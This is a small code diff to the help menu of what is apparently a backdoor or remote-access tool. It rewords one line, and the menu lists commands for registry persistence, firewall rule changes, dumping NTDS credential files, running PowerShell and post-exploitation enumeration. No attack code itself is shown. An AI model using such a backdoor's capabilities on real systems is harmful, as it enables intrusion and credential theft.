@@ -33,7 +33,7 @@ help = """
 * persistence -> set persistence using REGKEY (windows only)                   *
 * fw -> add firewall rules:  fw [in/out] [port number] [rule name]             *
 * ntds -> dump ntds  credential files in c:\windows\\temp                      *
-* powershell -> run the given powershell command or script                     *
+* powershell [cmd] OR [script] -> run the given powershell command or script   *
 * enum -> run post-exploitation enumeration                                    *
 * q -> kill the backdoor                                                       *
 * exit  -> exit the listener                                                   *
